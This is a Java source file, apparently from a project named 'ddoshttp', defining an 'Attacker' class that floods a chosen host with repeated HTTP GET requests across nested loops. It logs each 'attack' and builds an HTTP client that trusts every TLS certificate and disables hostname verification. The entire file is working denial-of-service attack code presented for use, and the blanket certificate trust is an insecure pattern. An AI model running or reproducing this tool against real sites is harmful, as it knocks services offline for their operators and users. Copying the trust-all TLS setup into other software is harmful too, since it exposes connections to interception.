package ua.cc.lajdev.ddoshttp.worker;

import ua.cc.lajdev.ddoshttp.DemoApplication;
import lombok.Builder;
import org.apache.http.config.Registry;
import org.apache.http.config.RegistryBuilder;
import org.apache.http.conn.socket.ConnectionSocketFactory;
import org.apache.http.conn.socket.PlainConnectionSocketFactory;
import org.apache.http.conn.ssl.NoopHostnameVerifier;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.impl.conn.BasicHttpClientConnectionManager;
import org.apache.http.ssl.SSLContexts;
import org.springframework.http.HttpMethod;
import org.springframework.http.ResponseEntity;
import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
import org.springframework.web.client.RestTemplate;

import javax.net.ssl.SSLContext;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;


@Builder
public class Attacker implements Runnable {

    private final int connectionsCount;
    private final int attackTimes;
    private final String hostName;

    @Override
    public void run() {
        try {
            CloseableHttpClient httpclient = getCloseableHttpClient();
            RestTemplate restTemplate = new RestTemplate(new HttpComponentsClientHttpRequestFactory(httpclient));
            for (int i = 0; i < connectionsCount; i++) {
                for (int j = 0; j < attackTimes; j++) {
                    ResponseEntity<String> response = restTemplate.exchange(hostName, HttpMethod.GET, null, String.class);
                    DemoApplication.printConsole(hostName + " attacked " + j + " times: Response: " + response.getStatusCodeValue());
                }
                httpclient.close();
            }
        } catch (Exception e) {
            printError(e.getMessage());
        }
    }

    private CloseableHttpClient getCloseableHttpClient() throws NoSuchAlgorithmException, KeyManagementException, KeyStoreException {
        SSLContext sslContext = SSLContexts.custom().loadTrustMaterial(null, (cert, authType) -> true).build();
        SSLConnectionSocketFactory sslsf = new SSLConnectionSocketFactory(sslContext, NoopHostnameVerifier.INSTANCE);
        Registry<ConnectionSocketFactory> socketFactoryRegistry = RegistryBuilder.<ConnectionSocketFactory>create()
                .register("https", sslsf)
                .register("http", new PlainConnectionSocketFactory())
                .build();
        return HttpClients.custom()
                .setSSLSocketFactory(sslsf)
                .setConnectionManager(new BasicHttpClientConnectionManager(socketFactoryRegistry))
                .build();
    }

    private void printError(String message) {
        DemoApplication.printConsole(message);
    }
}
